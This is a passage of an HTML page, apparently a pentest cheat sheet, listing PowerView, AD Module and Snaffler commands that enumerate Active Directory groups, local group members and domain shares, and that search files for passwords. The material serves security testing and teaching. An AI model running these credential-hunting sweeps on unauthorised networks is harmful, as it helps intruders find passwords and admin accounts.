role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGroup</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGroup</span> <span class="cm-operator">-</span><span class="cm-identifier">FullData</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADGroup</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span> </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADGroup</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 203px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-search-for-a-particu-0">Search for a particular string in attributes</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 412px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 412.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGroup</span> <span class="cm-operator">*</span><span class="cm-identifier">admin</span><span class="cm-operator">*</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADGroup</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-string">'Name -like "*admin*"'</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-all-users-in-a-speci">All users in a specific group</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 354px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 354.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">GroupName</span> <span class="cm-string">"&lt;group&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">Recurse</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"&lt;group&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">Recursive</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-all-groups-of-an-use">All groups of an user</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 354px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 354.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGroup</span> <span class="cm-operator">-</span><span class="cm-identifier">MemberIdentity</span> <span class="cm-string">"user1"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADPrincipalGroupMembership</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"user1"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-local-groups-enumera">Local groups enumeration</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 383px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 383.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetLocalGroup</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">ListGroups</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-members-of-local-gro">Members of local groups</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 362px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 361.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetLocalGroup</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Recurse</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-shares-%2F-files">Shares / Files</h3>
<h4 id="bkmrk-find-shares-on-the-d">Find shares on the domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 202.429px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-ShareFinder</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-sensitive-files-on-t">Sensitive files on the domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 325.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-FileFinder</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-FileFinder</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">Include</span> <span class="cm-string">"*pass*"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 95px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-or-with-snaffler">Or with Snaffler</p>
<p id="bkmrk-snaffler.exe--s---sn"><code>snaffler.exe -s - snaffler.log</code> ... (:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 303.762px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Snaffle all the computers in the domain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">Snaffler</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">d</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">DC</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">s</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Snaffle specific computers</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">Snaffler</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">n</span> <span class="cm-identifier">computer1</span><span class="cm-punctuation">,</span><span class="cm-identifier">computer2</span> <span class="cm-operator">-</span><span class="cm-identifier">s</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Snaffle a specific directory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">Snaffler</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">i</span> <span class="cm-builtin">C:</span><span class="cm-punctuation">\</span> <span class="cm-operator">-</span><span class="cm-identifier">s</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 225px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 